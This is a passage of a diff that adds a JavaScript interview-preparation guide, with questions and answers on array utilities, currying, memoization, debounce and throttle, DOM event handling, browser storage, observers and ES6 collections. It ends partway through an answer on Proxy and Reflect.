+  if (size <= 0) throw new Error("Chunk size must be positive");
+
+  const result = [];
+  for (let i = 0; i < arr.length; i += size) {
+    result.push(arr.slice(i, i + size));
+  }
+  return result;
+}
+
+chunk([1, 2, 3, 4, 5], 2);  // [[1, 2], [3, 4], [5]]
+chunk([1, 2, 3, 4, 5], 3);  // [[1, 2, 3], [4, 5]]
+
+// Using reduce:
+const chunk2 = (arr, size) =>
+  arr.reduce((acc, _, i) =>
+    i % size === 0 ? [...acc, arr.slice(i, i + size)] : acc, []);
+```
+
+---
+
+## Q59. Find duplicates in an array — multiple approaches.
+
+**Answer:**
+
+```js
+const arr = [1, 2, 3, 2, 4, 3, 5, 1];
+
+// Approach 1: Using Set (most efficient)
+function findDuplicates(arr) {
+  const seen = new Set();
+  const duplicates = new Set();
+  for (const item of arr) {
+    if (seen.has(item)) duplicates.add(item);
+    else seen.add(item);
+  }
+  return [...duplicates]; // [2, 3, 1]
+}
+
+// Approach 2: Using filter + indexOf
+arr.filter((item, index) => arr.indexOf(item) !== index);
+// [2, 3, 1] — keeps items where a copy exists earlier
+
+// Approach 3: Using reduce — also counts occurrences:
+const counts = arr.reduce((acc, item) => {
+  acc[item] = (acc[item] || 0) + 1;
+  return acc;
+}, {});
+Object.entries(counts)
+  .filter(([, count]) => count > 1)
+  .map(([item]) => Number(item)); // [1, 2, 3]
+```
+
+---
+
+## Q60. Implement `Object.assign` from scratch.
+
+**Answer:**
+
+```js
+function myObjectAssign(target, ...sources) {
+  if (target == null) throw new TypeError("Cannot convert undefined or null to object");
+
+  const result = Object(target);
+
+  for (const source of sources) {
+    if (source == null) continue; // skip null/undefined sources
+
+    // Object.keys gets only own enumerable string-keyed properties
+    for (const key of Object.keys(source)) {
+      result[key] = source[key];
+    }
+
+    // Also copy Symbol-keyed own enumerable properties:
+    for (const sym of Object.getOwnPropertySymbols(source)) {
+      if (Object.prototype.propertyIsEnumerable.call(source, sym)) {
+        result[sym] = source[sym];
+      }
+    }
+  }
+
+  return result;
+}
+
+// Note: Object.assign does a SHALLOW copy — nested objects are still by reference
+const obj = { a: 1, nested: { b: 2 } };
+const copy = myObjectAssign({}, obj);
+copy.nested.b = 99;
+console.log(obj.nested.b); // 99 — shared reference!
+```
+
+---
+
+## Q61. Implement a deep merge of two objects.
+
+**Answer:**
+
+```js
+function deepMerge(target, source) {
+  const result = { ...target }; // start with a shallow copy of target
+
+  for (const key of Object.keys(source)) {
+    const sourceVal = source[key];
+    const targetVal = result[key];
+
+    if (
+      typeof sourceVal === "object" && sourceVal !== null &&
+      typeof targetVal === "object" && targetVal !== null &&
+      !Array.isArray(sourceVal) && !Array.isArray(targetVal)
+    ) {
+      result[key] = deepMerge(targetVal, sourceVal); // recurse for nested objects
+    } else {
+      result[key] = sourceVal; // override with source value
+    }
+  }
+
+  return result;
+}
+
+const defaults = { theme: "light", font: { size: 14, family: "Arial" } };
+const userPrefs = { font: { size: 18 } }; // user only changes font size
+
+deepMerge(defaults, userPrefs);
+// { theme: "light", font: { size: 18, family: "Arial" } }
+// Note: font.family is preserved — not overwritten as in Object.assign!
+```
+
+---
+
+## Q62. Array methods: `some`, `every`, `find`, `findIndex` — implement them.
+
+**Answer:**
+
+```js
+// some — returns true if AT LEAST ONE element passes the test
+Array.prototype.mySome = function(callback) {
+  for (let i = 0; i < this.length; i++) {
+    if (callback(this[i], i, this)) return true; // short-circuits!
+  }
+  return false;
+};
+
+// every — returns true if ALL elements pass the test
+Array.prototype.myEvery = function(callback) {
+  for (let i = 0; i < this.length; i++) {
+    if (!callback(this[i], i, this)) return false; // short-circuits!
+  }
+  return true;
+};
+
+// find — returns FIRST element that passes the test
+Array.prototype.myFind = function(callback) {
+  for (let i = 0; i < this.length; i++) {
+    if (callback(this[i], i, this)) return this[i];
+  }
+  return undefined;
+};
+
+// findIndex — returns INDEX of first matching element
+Array.prototype.myFindIndex = function(callback) {
+  for (let i = 0; i < this.length; i++) {
+    if (callback(this[i], i, this)) return i;
+  }
+  return -1;
+};
+
+// Usage:
+const numbers = [1, 2, 3, 4, 5];
+numbers.mySome(n => n > 4);      // true
+numbers.myEvery(n => n > 0);     // true
+numbers.myFind(n => n > 3);      // 4
+numbers.myFindIndex(n => n > 3); // 3
+```
+
+---
+
+## Q63. How would you remove duplicates from an array? (multiple methods)
+
+**Answer:**
+
+```js
+const arr = [1, 2, 2, 3, 3, 3, 4];
+
+// Method 1: Set (simplest, most performant)
+[...new Set(arr)]; // [1, 2, 3, 4]
+
+// Method 2: filter + indexOf
+arr.filter((item, index) => arr.indexOf(item) === index);
+
+// Method 3: reduce
+arr.reduce((unique, item) =>
+  unique.includes(item) ? unique : [...unique, item], []);
+
+// For objects — remove duplicates by a property:
+const users = [
+  { id: 1, name: "Ravi" },
+  { id: 2, name: "Priya" },
+  { id: 1, name: "Ravi" } // duplicate
+];
+
+// Using Map (preserves order, O(n)):
+const unique = [...new Map(users.map(u => [u.id, u])).values()];
+// [{ id: 1, name: "Ravi" }, { id: 2, name: "Priya" }]
+```
+
+---
+
+## Q64. Implement `Array.prototype.sort` — explain the comparison function.
+
+**Answer:**
+
+```js
+// Default sort — converts to strings and sorts lexicographically (DANGEROUS for numbers!):
+[10, 2, 21, 1].sort(); // [1, 10, 2, 21] ← WRONG for numbers!
+
+// Correct numeric sort:
+[10, 2, 21, 1].sort((a, b) => a - b); // [1, 2, 10, 21] ascending
+[10, 2, 21, 1].sort((a, b) => b - a); // [21, 10, 2, 1] descending
+
+// The comparator: return negative → a before b, 0 → equal, positive → b before a
+
+// Sort objects by property:
+const users = [
+  { name: "Ravi", age: 30 },
+  { name: "Priya", age: 25 },
+  { name: "Kiran", age: 28 }
+];
+
+// By age ascending:
+users.sort((a, b) => a.age - b.age);
+
+// By name alphabetically:
+users.sort((a, b) => a.name.localeCompare(b.name));
+
+// Multi-criteria sort:
+users.sort((a, b) => {
+  if (a.age !== b.age) return a.age - b.age; // primary: by age
+  return a.name.localeCompare(b.name);        // secondary: by name
+});
+
+// Stable sort: Array.sort is guaranteed stable in modern JS engines (ES2019+)
+```
+
+---
+
+## Q65. Implement `Array.from` from scratch.
+
+**Answer:**
+
+`Array.from()` creates an array from array-like objects or iterables, with an optional mapping function:
+
+```js
+function myArrayFrom(arrayLike, mapFn) {
+  const result = [];
+
+  // Handle iterables (has Symbol.iterator):
+  if (arrayLike[Symbol.iterator]) {
+    for (const item of arrayLike) {
+      result.push(mapFn ? mapFn(item) : item);
+    }
+    return result;
+  }
+
+  // Handle array-like objects (have .length):
+  const length = arrayLike.length || 0;
+  for (let i = 0; i < length; i++) {
+    result.push(mapFn ? mapFn(arrayLike[i], i) : arrayLike[i]);
+  }
+
+  return result;
+}
+
+// Use cases:
+Array.from("hello");             // ["h","e","l","l","o"]
+Array.from({ length: 5 }, (_, i) => i); // [0, 1, 2, 3, 4]
+Array.from(new Set([1, 2, 2, 3]));      // [1, 2, 3]
+Array.from(document.querySelectorAll("div")); // real array from NodeList
+```
+
+---
+
+---
+
+# 6. Functional Programming
+
+---
+
+## Q66. What is currying? Implement it.
+
+**Answer:**
+
+Currying transforms a function that takes multiple arguments into a series of functions that each take one argument. Instead of `fn(a, b, c)`, you call `fn(a)(b)(c)`.
+
+```js
+// Manual curry for a specific arity:
+const add = a => b => c => a + b + c;
+add(1)(2)(3); // 6
+
+// Generic curry function:
+function curry(fn) {
+  return function curried(...args) {
+    if (args.length >= fn.length) {
+      // We have enough args — call the original function
+      return fn.apply(this, args);
+    }
+    // Not enough args — return a function collecting more
+    return function(...moreArgs) {
+      return curried.apply(this, args.concat(moreArgs));
+    };
+  };
+}
+
+const multiply = curry((a, b, c) => a * b * c);
+multiply(2)(3)(4);     // 24
+multiply(2, 3)(4);     // 24 — partial application
+multiply(2)(3, 4);     // 24
+multiply(2, 3, 4);     // 24
+
+// Real-world use case — reusable functions via partial application:
+const addTax = curry((taxRate, price) => price + price * taxRate);
+const addGST = addTax(0.18); // partially applied
+
+addGST(100); // 118
+addGST(200); // 236
+```
+
+---
+
+## Q67. What is `pipe` and `compose`? Implement them.
+
+**Answer:**
+
+Both are higher-order functions that combine multiple functions into one. The difference is the **order of execution**:
+
+```js
+// compose — applies right to left (mathematical notation: f∘g∘h)
+const compose = (...fns) => (x) => fns.reduceRight((v, f) => f(v), x);
+
+// pipe — applies left to right (more readable for most developers)
+const pipe = (...fns) => (x) => fns.reduce((v, f) => f(v), x);
+
+// Example functions:
+const double = x => x * 2;
+const addOne = x => x + 1;
+const square = x => x * x;
+
+const transform1 = compose(square, addOne, double); // double first, then addOne, then square
+transform1(3); // double(3)=6, addOne(6)=7, square(7)=49
+
+const transform2 = pipe(double, addOne, square); // same operations, same order
+transform2(3); // 49
+
+// Real-world data processing pipeline:
+const processUser = pipe(
+  user => ({ ...user, name: user.name.trim() }),
+  user => ({ ...user, email: user.email.toLowerCase() }),
+  user => ({ ...user, age: Number(user.age) }),
+  user => ({ ...user, isAdult: user.age >= 18 })
+);
+
+processUser({ name: "  Ravi  ", email: "RAVI@EMAIL.COM", age: "25" });
+// { name: "Ravi", email: "ravi@email.com", age: 25, isAdult: true }
+```
+
+---
+
+## Q68. What is memoization? Implement it.
+
+**Answer:**
+
+Memoization is an optimization technique that **caches the results** of function calls based on their arguments. Subsequent calls with the same arguments return the cached result instead of re-computing.
+
+```js
+function memoize(fn) {
+  const cache = new Map();
+
+  return function(...args) {
+    const key = JSON.stringify(args); // serialize args as cache key
+
+    if (cache.has(key)) {
+      console.log("Cache hit!");
+      return cache.get(key);
+    }
+
+    const result = fn.apply(this, args);
+    cache.set(key, result);
+    return result;
+  };
+}
+
+// Use case — expensive computation:
+const fibonacci = memoize(function(n) {
+  if (n <= 1) return n;
+  return fibonacci(n - 1) + fibonacci(n - 2); // recursive calls also benefit from cache
+});
+
+fibonacci(40); // computes once
+fibonacci(40); // instant — from cache
+
+// Use case — API calls:
+const fetchUserMemo = memoize(fetchUser);
+fetchUserMemo(1); // hits API
+fetchUserMemo(1); // returns cached Promise
+
+// Memoize with TTL (Time To Live):
+function memoizeWithTTL(fn, ttl = 60000) {
+  const cache = new Map();
+
+  return function(...args) {
+    const key = JSON.stringify(args);
+    const cached = cache.get(key);
+
+    if (cached && Date.now() - cached.timestamp < ttl) {
+      return cached.value;
+    }
+
+    const result = fn.apply(this, args);
+    cache.set(key, { value: result, timestamp: Date.now() });
+    return result;
+  };
+}
+```
+
+---
+
+## Q69. Implement `debounce` and `throttle` from scratch.
+
+**Answer:**
+
+**Debounce** — delays execution until after a specified time has elapsed since the last call. Like waiting for a user to stop typing.
+
+```js
+function debounce(fn, delay) {
+  let timer = null;
+
+  return function(...args) {
+    clearTimeout(timer); // reset timer on every call
+
+    timer = setTimeout(() => {
+      fn.apply(this, args); // call original function after delay
+      timer = null;
+    }, delay);
+  };
+}
+
+// Usage:
+const handleSearch = debounce((query) => {
+  fetch(`/api/search?q=${query}`);
+}, 300); // only fires 300ms after user stops typing
+
+input.addEventListener("input", e => handleSearch(e.target.value));
+```
+
+**Throttle** — limits a function to fire at most once per specified interval, no matter how often it's called.
+
+```js
+function throttle(fn, limit) {
+  let lastCallTime = 0;
+  let timer = null;
+
+  return function(...args) {
+    const now = Date.now();
+    const remaining = limit - (now - lastCallTime);
+
+    if (remaining <= 0) {
+      // Enough time has passed — call immediately
+      if (timer) { clearTimeout(timer); timer = null; }
+      lastCallTime = now;
+      fn.apply(this, args);
+    } else {
+      // Schedule for when the remaining time expires
+      clearTimeout(timer);
+      timer = setTimeout(() => {
+        lastCallTime = Date.now();
+        timer = null;
+        fn.apply(this, args);
+      }, remaining);
+    }
+  };
+}
+
+// Usage:
+const handleScroll = throttle(() => {
+  checkIfBottomReached();
+}, 200); // fires at most every 200ms
+
+window.addEventListener("scroll", handleScroll);
+```
+
+---
+
+## Q70. What is a Higher-Order Function (HOF)? Give real examples.
+
+**Answer:**
+
+A Higher-Order Function is a function that either **takes a function as an argument** or **returns a function** (or both). This is one of the cornerstones of functional programming in JS.
+
+```js
+// HOF that takes a function:
+[1, 2, 3].map(x => x * 2);    // map takes a function
+[1, 2, 3].filter(x => x > 1); // filter takes a function
+[1, 2, 3].reduce((a, b) => a + b, 0); // reduce takes a function
+
+// HOF that returns a function:
+function multiplier(factor) {
+  return (number) => number * factor; // returns a function!
+}
+const double = multiplier(2);
+const triple = multiplier(3);
+
+// HOF that does both:
+function repeat(fn, times) {
+  return function(...args) {
+    for (let i = 0; i < times; i++) fn(...args);
+  };
+}
+const sayHiThrice = repeat(() => console.log("Hi!"), 3);
+sayHiThrice(); // "Hi!" "Hi!" "Hi!"
+
+// Real-world: middleware in Express (HOF pattern):
+function logger(fn) {
+  return function(...args) {
+    console.log("Calling with:", args);
+    const result = fn.apply(this, args);
+    console.log("Result:", result);
+    return result;
+  };
+}
+
+const loggedAdd = logger((a, b) => a + b);
+loggedAdd(2, 3); // logs args and result
+```
+
+---
+
+## Q71. What is function composition and how does it help?
+
+**Answer:**
+
+Function composition is the practice of combining simple, focused functions into more complex ones. Each function does one thing well, and you compose them to build complex behavior.
+
+```js
+// Without composition — hard to read and test:
+function processOrder(order) {
+  const validated = validateOrder(order);
+  const discounted = applyDiscount(validated, 0.1);
+  const taxed = addTax(discounted, 0.18);
+  const formatted = formatForDisplay(taxed);
+  return formatted;
+}
+
+// With composition — declarative, each step is testable:
+const processOrder = pipe(
+  validateOrder,
+  order => applyDiscount(order, 0.1),
+  order => addTax(order, 0.18),
+  formatForDisplay
+);
+
+// Benefits:
+// 1. Each function is small and unit-testable independently
+// 2. The pipeline is readable — you can see the data flow
+// 3. Functions are reusable — can be composed differently elsewhere
+// 4. Easier to add/remove steps (just add/remove from the pipe)
+```
+
+---
+
+## Q72. What is a pure function? Why does it matter?
+
+**Answer:**
+
+A pure function is a function that:
+1. Given the same inputs, **always returns the same output**
+2. Has **no side effects** (doesn't modify external state, DOM, global variables, etc.)
+
+```js
+// Pure function:
+function add(a, b) {
+  return a + b; // same input → always same output, no side effects
+}
+
+// Impure — reads external state:
+let multiplier = 3;
+function multiply(x) {
+  return x * multiplier; // depends on external variable
+}
+multiplier = 5;
+multiply(2); // 10 now, but was 6 before!
+
+// Impure — modifies external state (side effect):
+const users = [];
+function addUser(name) {
+  users.push(name); // mutates external array — side effect!
+}
+
+// Pure version — returns new array instead of mutating:
+function addUser(users, name) {
+  return [...users, name]; // original array unchanged
+}
+
+// Pure functions are:
+// ✅ Easily testable — no setup/teardown of external state needed
+// ✅ Predictable and cacheable (memoizable)
+// ✅ Safe to run in parallel
+// ✅ Easy to reason about
+```
+
+---
+
+## Q73. Implement `once` — a function that can only be called once.
+
+**Answer:**
+
+```js
+function once(fn) {
+  let called = false;
+  let result;
+
+  return function(...args) {
+    if (called) return result; // return cached result on subsequent calls
+    called = true;
+    result = fn.apply(this, args);
+    return result;
+  };
+}
+
+// Usage:
+const initialize = once(() => {
+  console.log("Initializing...");
+  return { ready: true };
+});
+
+initialize(); // "Initializing..." → { ready: true }
+initialize(); // { ready: true } — no log, no re-run
+initialize(); // { ready: true }
+
+// Real-world use: singleton initialization, one-time event handlers
+const onFirstClick = once(() => analytics.track("first_click"));
+document.addEventListener("click", onFirstClick);
+```
+
+---
+
+## Q74. Implement `partial application`.
+
+**Answer:**
+
+Partial application creates a new function by **pre-filling some arguments** of an existing function. Unlike currying (which always produces unary functions), partial application can fill any number of arguments.
+
+```js
+function partial(fn, ...presetArgs) {
+  return function(...laterArgs) {
+    return fn(...presetArgs, ...laterArgs);
+  };
+}
+
+// Usage:
+function greet(greeting, title, name) {
+  return `${greeting}, ${title} ${name}!`;
+}
+
+const sayHello = partial(greet, "Hello");
+const sayHelloMr = partial(greet, "Hello", "Mr.");
+
+sayHello("Dr.", "Ravi");   // "Hello, Dr. Ravi!"
+sayHelloMr("Kumar");        // "Hello, Mr. Kumar!"
+
+// Real-world: creating specialized API callers:
+function apiCall(baseUrl, endpoint, params) {
+  return fetch(`${baseUrl}${endpoint}?${new URLSearchParams(params)}`);
+}
+
+const callMyAPI = partial(apiCall, "https://api.myapp.com");
+const getUsers = partial(callMyAPI, "/users");
+
+getUsers({ page: 1, limit: 10 }); // fully applied
+```
+
+---
+
+## Q75. What is tail call optimization (TCO)?
+
+**Answer:**
+
+A tail call is when a function's last action is to call another function and return its result. With TCO, the engine can optimize tail-recursive functions to avoid stack overflow by reusing the same stack frame.
+
+```js
+// Regular recursion — each call adds to the stack:
+function factorial(n) {
+  if (n <= 1) return 1;
+  return n * factorial(n - 1); // NOT a tail call — must multiply after recursion
+}
+// factorial(100000) → Stack overflow!
+
+// Tail-recursive version:
+function factorialTCO(n, accumulator = 1) {
+  if (n <= 1) return accumulator;
+  return factorialTCO(n - 1, n * accumulator); // IS a tail call — nothing left to do after
+}
+// With TCO, this doesn't grow the stack
+// (Note: TCO is only guaranteed in strict mode and ES6+ — browser support is limited)
+
+// Practical workaround — use a loop or trampoline if TCO isn't available:
+function factorial(n) {
+  let result = 1;
+  while (n > 1) {
+    result *= n;
+    n--;
+  }
+  return result;
+}
+```
+
+---
+
+---
+
+# 7. DOM, Events & Browser APIs
+
+---
+
+## Q76. What is event delegation and why is it important?
+
+**Answer:**
+
+Event delegation is a pattern where you attach a **single event listener to a parent element** instead of attaching individual listeners to each child. It works because of **event bubbling** — events propagate up from the target element to its ancestors.
+
+```js
+// ❌ Without delegation — 1000 listeners for 1000 items:
+document.querySelectorAll(".todo-item").forEach(item => {
+  item.addEventListener("click", handleClick);
+});
+
+// ✅ With delegation — 1 listener for ALL items (including future ones):
+document.getElementById("todo-list").addEventListener("click", function(event) {
+  // event.target is the actual clicked element
+  const item = event.target.closest(".todo-item"); // find the todo item
+  if (!item) return; // clicked somewhere else in the list
+
+  handleClick(item);
+});
+```
+
+**Why it matters:**
+1. **Performance** — fewer event listeners in memory
+2. **Dynamic elements** — works for elements added to the DOM after the listener is attached (e.g., items added via AJAX)
+3. **Memory management** — no need to remove listeners from each child when they're removed
+
+**Event methods:**
+```js
+container.addEventListener("click", function(e) {
+  e.target;           // the element actually clicked
+  e.currentTarget;    // the element the listener is attached to
+  e.stopPropagation(); // stop bubbling
+  e.preventDefault();  // prevent default browser behavior (e.g., form submit, link)
+});
+```
+
+---
+
+## Q77. Explain Event Bubbling, Capturing, and `stopPropagation`.
+
+**Answer:**
+
+When an event fires, it goes through three phases:
+
+1. **Capture phase** — event travels DOWN from `window` → `document` → parent → target
+2. **Target phase** — event reaches the target element
+3. **Bubble phase** — event travels UP from target → parent → `document` → `window`
+
+```html
+<div id="parent">
+  <button id="child">Click me</button>
+</div>
+```
+
+```js
+// Third argument: true = capture, false/omitted = bubble (default)
+document.getElementById("parent").addEventListener("click", () => {
+  console.log("Parent - Bubble");
+}, false);
+
+document.getElementById("parent").addEventListener("click", () => {
+  console.log("Parent - Capture");
+}, true);
+
+document.getElementById("child").addEventListener("click", () => {
+  console.log("Child clicked");
+});
+
+// Clicking the button:
+// 1. Parent - Capture (capture phase, top-down)
+// 2. Child clicked (target phase)
+// 3. Parent - Bubble (bubble phase, bottom-up)
+
+// Stop bubbling:
+document.getElementById("child").addEventListener("click", (e) => {
+  e.stopPropagation(); // parent's bubble listener won't fire
+  console.log("Child — stopped here");
+});
+
+// stopImmediatePropagation() — also stops OTHER listeners on the SAME element:
+element.addEventListener("click", (e) => {
+  e.stopImmediatePropagation(); // no other click listeners on this element run
+});
+```
+
+---
+
+## Q78. Implement `debounce` for search input in a real-world scenario.
+
+**Answer:**
+
+```js
+// Full real-world implementation with loading state and abort:
+function createSearchHandler(searchFn, delay = 300) {
+  let timer = null;
+  let controller = null;
+
+  return async function(query) {
+    clearTimeout(timer);
+
+    // Cancel previous pending request:
+    if (controller) {
+      controller.abort();
+    }
+
+    if (!query.trim()) {
+      renderResults([]);
+      return;
+    }
+
+    timer = setTimeout(async () => {
+      controller = new AbortController();
+
+      try {
+        showLoader();
+        const results = await searchFn(query, controller.signal);
+        renderResults(results);
+      } catch (err) {
+        if (err.name !== "AbortError") {
+          showError(err.message);
+        }
+      } finally {
+        hideLoader();
+      }
+    }, delay);
+  };
+}
+
+const handleSearch = createSearchHandler(async (query, signal) => {
+  const res = await fetch(`/api/search?q=${query}`, { signal });
+  return res.json();
+});
+
+document.getElementById("search").addEventListener("input", e => {
+  handleSearch(e.target.value);
+});
+```
+
+---
+
+## Q79. Implement Infinite Scroll.
+
+**Answer:**
+
+```js
+class InfiniteScroll {
+  constructor(container, fetchFn) {
+    this.container = container;
+    this.fetchFn = fetchFn;
+    this.page = 1;
+    this.loading = false;
+    this.hasMore = true;
+
+    // IntersectionObserver is more performant than scroll events:
+    this.observer = new IntersectionObserver(
+      (entries) => {
+        if (entries[0].isIntersecting && !this.loading && this.hasMore) {
+          this.loadMore();
+        }
+      },
+      { threshold: 0.1 } // trigger when 10% of sentinel is visible
+    );
+
+    // Sentinel element — we observe this at the bottom of the list:
+    this.sentinel = document.createElement("div");
+    this.sentinel.id = "scroll-sentinel";
+    container.appendChild(this.sentinel);
+    this.observer.observe(this.sentinel);
+  }
+
+  async loadMore() {
+    this.loading = true;
+    this.showLoader();
+
+    try {
+      const { data, hasMore } = await this.fetchFn(this.page);
+      this.renderItems(data);
+      this.page++;
+      this.hasMore = hasMore;
+
+      if (!hasMore) {
+        this.observer.disconnect();
+        this.showEndMessage();
+      }
+    } catch (err) {
+      this.showError(err.message);
+    } finally {
+      this.loading = false;
+      this.hideLoader();
+    }
+  }
+
+  renderItems(items) {
+    items.forEach(item => {
+      const el = document.createElement("div");
+      el.textContent = item.name;
+      this.container.insertBefore(el, this.sentinel);
+    });
+  }
+
+  showLoader() { /* ... */ }
+  hideLoader() { /* ... */ }
+  showEndMessage() { /* ... */ }
+  showError(msg) { /* ... */ }
+}
+```
+
+---
+
+## Q80. Implement a virtual DOM diffing concept.
+
+**Answer:**
+
+```js
+// Simplified virtual DOM node:
+function createElement(type, props, ...children) {
+  return { type, props: props || {}, children: children.flat() };
+}
+
+// Diff two virtual DOM trees and produce patches:
+function diff(oldVNode, newVNode) {
+  // Node was removed:
+  if (!newVNode) return { type: "REMOVE" };
+
+  // Node was added (no old node):
+  if (!oldVNode) return { type: "ADD", node: newVNode };
+
+  // Types differ — replace entirely:
+  if (oldVNode.type !== newVNode.type) {
+    return { type: "REPLACE", node: newVNode };
+  }
+
+  // Same type — check props and children:
+  const patches = [];
+  const propDiff = diffProps(oldVNode.props, newVNode.props);
+  if (propDiff.length) patches.push({ type: "PROPS", patches: propDiff });
+
+  const childPatches = diffChildren(oldVNode.children, newVNode.children);
+  if (childPatches.length) patches.push({ type: "CHILDREN", patches: childPatches });
+
+  return patches.length ? { type: "UPDATE", patches } : null;
+}
+
+function diffProps(oldProps, newProps) {
+  const patches = [];
+  const allKeys = new Set([...Object.keys(oldProps), ...Object.keys(newProps)]);
+
+  for (const key of allKeys) {
+    if (oldProps[key] !== newProps[key]) {
+      patches.push({ key, value: newProps[key] });
+    }
+  }
+  return patches;
+}
+```
+
+---
+
+## Q81. What is the difference between `localStorage`, `sessionStorage`, and `cookies`?
+
+**Answer:**
+
+| Feature | localStorage | sessionStorage | Cookies |
+|---|---|---|---|
+| Capacity | ~5-10MB | ~5MB | ~4KB |
+| Expiry | Never (manual) | Tab close | Set manually |
+| Sent with HTTP | No | No | Yes (automatically) |
+| Accessible from JS | Yes | Yes | Yes (if not HttpOnly) |
+| Scope | Origin | Origin + Tab | Domain + Path |
+
+```js
+// localStorage — persists across sessions:
+localStorage.setItem("theme", "dark");
+localStorage.getItem("theme"); // "dark"
+localStorage.removeItem("theme");
+localStorage.clear(); // remove all
+
+// sessionStorage — clears when tab closes:
+sessionStorage.setItem("tempToken", "abc123");
+
+// Cookies — sent with every HTTP request (authentication):
+document.cookie = "user=ravi; path=/; max-age=3600; Secure; SameSite=Strict";
+
+// Reading cookies (cumbersome — no native get by key):
+const getCookie = (name) => {
+  const match = document.cookie.match(new RegExp(`(^| )${name}=([^;]+)`));
+  return match ? match[2] : null;
+};
+
+// Best practices:
+// - Auth tokens → HttpOnly cookies (JS can't read — XSS safe)
+// - User preferences → localStorage
+// - Wizard/multi-step form state → sessionStorage
+```
+
+---
+
+## Q82. What is the `IntersectionObserver` API?
+
+**Answer:**
+
+`IntersectionObserver` provides a way to asynchronously observe when an element enters or exits the viewport (or another element). It's far more performant than listening to `scroll` events.
+
+```js
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      // Element has entered the viewport
+      entry.target.classList.add("visible");
+      observer.unobserve(entry.target); // stop observing after first trigger
+
+      // Or lazy-load an image:
+      const img = entry.target;
+      img.src = img.dataset.src; // load the actual image
+    }
+  });
+}, {
+  threshold: 0.1,   // trigger when 10% visible
+  rootMargin: "0px 0px -50px 0px" // shrink the effective viewport by 50px at bottom
+});
+
+// Observe elements:
+document.querySelectorAll(".lazy-image").forEach(img => observer.observe(img));
+
+// Use cases: lazy loading images, infinite scroll, animations on scroll,
+// analytics (tracking when content is seen), sticky header detection
+```
+
+---
+
+## Q83. Implement a simple `EventEmitter` class.
+
+**Answer:**
+
+```js
+class EventEmitter {
+  constructor() {
+    this._events = {};
+  }
+
+  // Subscribe to an event:
+  on(event, listener) {
+    if (!this._events[event]) {
+      this._events[event] = [];
+    }
+    this._events[event].push(listener);
+    return this; // allow chaining: emitter.on("a", fn).on("b", fn)
+  }
+
+  // Unsubscribe:
+  off(event, listener) {
+    if (!this._events[event]) return this;
+    this._events[event] = this._events[event].filter(l => l !== listener);
+    return this;
+  }
+
+  // Emit (publish):
+  emit(event, ...args) {
+    if (!this._events[event]) return false;
+    this._events[event].forEach(listener => listener.apply(this, args));
+    return true;
+  }
+
+  // Subscribe only ONCE — auto-removes after first trigger:
+  once(event, listener) {
+    const wrapper = (...args) => {
+      listener.apply(this, args);
+      this.off(event, wrapper);
+    };
+    wrapper._original = listener; // save reference for off() to work
+    return this.on(event, wrapper);
+  }
+
+  // Remove all listeners for an event:
+  removeAllListeners(event) {
+    if (event) {
+      delete this._events[event];
+    } else {
+      this._events = {};
+    }
+    return this;
+  }
+}
+
+// Usage:
+const bus = new EventEmitter();
+
+const handleData = (data) => console.log("Received:", data);
+bus.on("data", handleData);
+bus.once("connect", () => console.log("Connected once"));
+
+bus.emit("data", { user: "Ravi" }); // "Received: { user: 'Ravi' }"
+bus.emit("connect");                 // "Connected once"
+bus.emit("connect");                 // nothing — already removed
+
+bus.off("data", handleData);
+bus.emit("data", "anything");        // nothing — removed
+```
+
+---
+
+## Q84. What is the `MutationObserver` API?
+
+**Answer:**
+
+`MutationObserver` watches for changes to the DOM tree — additions/removals of nodes, attribute changes, text changes — without needing polling.
+
+```js
+const observer = new MutationObserver((mutations) => {
+  mutations.forEach(mutation => {
+    if (mutation.type === "childList") {
+      console.log("Children changed:", mutation.addedNodes, mutation.removedNodes);
+    }
+    if (mutation.type === "attributes") {
+      console.log(`Attribute "${mutation.attributeName}" changed`);
+    }
+    if (mutation.type === "characterData") {
+      console.log("Text changed:", mutation.target.data);
+    }
+  });
+});
+
+observer.observe(document.getElementById("container"), {
+  childList: true,       // watch for child node additions/removals
+  attributes: true,      // watch for attribute changes
+  subtree: true,         // observe all descendants, not just direct children
+  characterData: true,   // watch for text node changes
+  attributeOldValue: true // include old attribute value in mutation record
+});
+
+// Stop observing:
+observer.disconnect();
+
+// Use cases:
+// - Third-party libraries modifying your DOM
+// - Auto-save when content-editable text changes
+// - Accessibility tools watching for ARIA changes
+// - Analytics tracking DOM changes
+```
+
+---
+
+---
+
+# 8. ES6+ Modern JavaScript
+
+---
+
+## Q85. What are `Map` and `Set`? How are they different from plain objects and arrays?
+
+**Answer:**
+
+**`Map`** is a collection of key-value pairs where keys can be **ANY type** (objects, functions, etc.), unlike plain objects where keys are always strings or Symbols.
+
+```js
+const map = new Map();
+const objKey = { id: 1 };
+
+map.set("string", "value");
+map.set(objKey, "object as key"); // possible! — not in plain object
+map.set(42, "number key");
+
+map.get(objKey); // "object as key"
+map.size;        // 3 (always O(1))
+map.has("string"); // true
+
+// Iterating in insertion order (guaranteed!):
+for (const [key, value] of map) {
+  console.log(key, value);
+}
+
+// Map vs Object:
+// ✅ Map: any key type, maintains insertion order, size property, better iteration
+// ✅ Object: literal syntax, JSON serializable, prototype-based
+
+// WeakMap — keys must be objects, not enumerable, allows garbage collection:
+const weakMap = new WeakMap();
+weakMap.set(domElement, metadata); // if domElement is removed, metadata is GC'd too
+```
+
+**`Set`** is a collection of **unique values**:
+
+```js
+const set = new Set([1, 2, 2, 3, 3, 3]);
+console.log([...set]); // [1, 2, 3] — duplicates removed
+
+set.add(4);
+set.has(2);    // true
+set.delete(2);
+set.size;      // 3
+
+// Union, intersection, difference:
+const a = new Set([1, 2, 3, 4]);
+const b = new Set([3, 4, 5, 6]);
+
+const union = new Set([...a, ...b]);        // {1,2,3,4,5,6}
+const intersection = new Set([...a].filter(x => b.has(x))); // {3,4}
+const difference = new Set([...a].filter(x => !b.has(x)));  // {1,2}
+```
+
+---
+
+## Q86. What are Proxy and Reflect in JavaScript?
+
+**Answer:**
+
+`Proxy` creates a wrapper around an object that intercepts fundamental operations like property access, assignment, function calls, etc. `Reflect` provides the same operations as the proxy traps, as plain functions.
+
+```js
+const handler = {
+  get(target, prop, receiver) {
+    console.log(`Getting ${prop}`);
+    return Reflect.get(target, prop, receiver); // perform the default operation
+  },
+  set(target, prop, value, receiver) {
+    if (typeof value !== "number") throw new TypeError(`${prop} must be a number`);
+    console.log(`Setting ${prop} = ${value}`);
+    return Reflect.set(target, prop, value, receiver);
+  },
+  has(target, prop) {
+    // intercept the 'in' operator
+    console.log(`Checking if ${prop} exists`);
